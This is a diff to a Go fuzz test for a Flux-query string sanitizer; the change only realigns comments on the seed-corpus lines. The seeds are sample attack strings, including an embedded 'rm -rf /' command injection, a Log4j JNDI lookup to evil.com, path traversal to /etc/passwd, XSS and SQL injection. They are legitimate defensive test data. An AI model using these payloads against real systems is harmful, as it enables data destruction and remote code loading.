@@ -12,34 +12,34 @@ import (
 // This is critical for security to prevent Flux injection attacks
 func FuzzSanitizeFluxString(f *testing.F) {
 	// Seed corpus with known attack patterns and edge cases
-	f.Add("simple-device-123")                                // Normal input
-	f.Add("")                                                 // Empty string
-	f.Add("device\"with\"quotes")                             // Quotes
-	f.Add("device\\with\\backslashes")                        // Backslashes
-	f.Add("\") |> drop() //")                                 // Flux injection attempt
-	f.Add("device\nwith\nnewlines")                           // Newlines
-	f.Add("device\rwith\rcarriage\rreturns")                  // Carriage returns
-	f.Add("device\x00with\x00nulls")                          // Null bytes
-	f.Add("\"\\\n\r\x00")                                     // All special chars
-	f.Add(") |> drop() |> from(bucket: \"malicious")          // Drop table injection
-	f.Add("\"; import \"os\"; os.system(\"rm -rf /\"); //")   // System command injection
-	f.Add("' OR '1'='1")                                      // SQL-style injection
-	f.Add("${jndi:ldap://evil.com/a}")                        // Log4j-style injection
-	f.Add("../../../etc/passwd")                              // Path traversal
-	f.Add("<script>alert('xss')</script>")                    // XSS attempt
-	f.Add("SELECT * FROM users")                              // SQL injection
-	f.Add("|> yield()")                                       // Flux pipe
-	f.Add("from(bucket: \"other\")")                          // Bucket switching
-	f.Add(strings.Repeat("A", 2000))                          // Very long string
-	f.Add(strings.Repeat("\"", 100))                          // Many quotes
-	f.Add(strings.Repeat("\\", 100))                          // Many backslashes
-	f.Add(strings.Repeat("\n", 100))                          // Many newlines
-	f.Add("device\u0000unicode\u0001control\u001fchars")      // Unicode control chars
-	f.Add("device\t\v\f")                                     // Other whitespace chars
-	f.Add("🔥💀👾")                                             // Emoji
+	f.Add("simple-device-123")                              // Normal input
+	f.Add("")                                               // Empty string
+	f.Add("device\"with\"quotes")                           // Quotes
+	f.Add("device\\with\\backslashes")                      // Backslashes
+	f.Add("\") |> drop() //")                               // Flux injection attempt
+	f.Add("device\nwith\nnewlines")                         // Newlines
+	f.Add("device\rwith\rcarriage\rreturns")                // Carriage returns
+	f.Add("device\x00with\x00nulls")                        // Null bytes
+	f.Add("\"\\\n\r\x00")                                   // All special chars
+	f.Add(") |> drop() |> from(bucket: \"malicious")        // Drop table injection
+	f.Add("\"; import \"os\"; os.system(\"rm -rf /\"); //") // System command injection
+	f.Add("' OR '1'='1")                                    // SQL-style injection
+	f.Add("${jndi:ldap://evil.com/a}")                      // Log4j-style injection
+	f.Add("../../../etc/passwd")                            // Path traversal
+	f.Add("<script>alert('xss')</script>")                  // XSS attempt
+	f.Add("SELECT * FROM users")                            // SQL injection
+	f.Add("|> yield()")                                     // Flux pipe
+	f.Add("from(bucket: \"other\")")                        // Bucket switching
+	f.Add(strings.Repeat("A", 2000))                        // Very long string
+	f.Add(strings.Repeat("\"", 100))                        // Many quotes
+	f.Add(strings.Repeat("\\", 100))                        // Many backslashes
+	f.Add(strings.Repeat("\n", 100))                        // Many newlines
+	f.Add("device\u0000unicode\u0001control\u001fchars")    // Unicode control chars
+	f.Add("device\t\v\f")                                   // Other whitespace chars
+	f.Add("🔥💀👾")                                            // Emoji
 	f.Add("日本語デバイス")                                        // Japanese
-	f.Add("设备测试")                                            // Chinese
-	f.Add("Устройство")                                       // Russian
+	f.Add("设备测试")                                           // Chinese
+	f.Add("Устройство")                                     // Russian
 
 	f.Fuzz(func(t *testing.T, input string) {
 		// Call should never panic
